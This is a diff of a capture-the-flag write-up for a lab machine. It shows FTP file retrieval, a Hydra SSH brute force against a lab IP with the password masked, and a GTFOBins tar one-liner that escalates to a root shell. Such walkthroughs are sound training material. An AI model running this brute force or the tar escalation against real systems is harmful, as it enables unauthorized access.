@@ -59,18 +59,16 @@ task.txt
 ftp: 24 bytes received in 0.00Seconds 24.00Kbytes/sec.
 ```
 
-Using `mget *` I downloaded both files, and in my local directory I saw the content.\
-Question 1 - Who wrote the task list? - Lin \
-Question 2 - What service can you bruteforce with the text file found? - SSH
+Using `mget *` I downloaded both files, and in my local directory I saw the content.
 
 The next thing was getting Hydra ready. I passed the `-l lin` for user and `-P locks.txt` for the list and .. 
 
 `[22][ssh] host: 10.10.113.185   login: lin   password: ******************`
 
-Houston, we're in. \
+Houston, we're in.
 
 Now that I had the SSH login credentials, I decided to look around. So, I logged in `ssh lin@10.10.113.185`. Inside, I listed the contents
-of the current directory and found the first flag.\
+of the current directory and found the first flag.
 Question 4 - user.txt
 
 
@@ -93,7 +91,7 @@ With this, I decided to go to [GTFOBins](https://gtfobins.github.io/) and search
 
 `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`
 
-Aaaanddd, we have root. \
+Aaaanddd, we have root.
 
 ```bash
 root@bountyhacker:~/Desktop# whoami
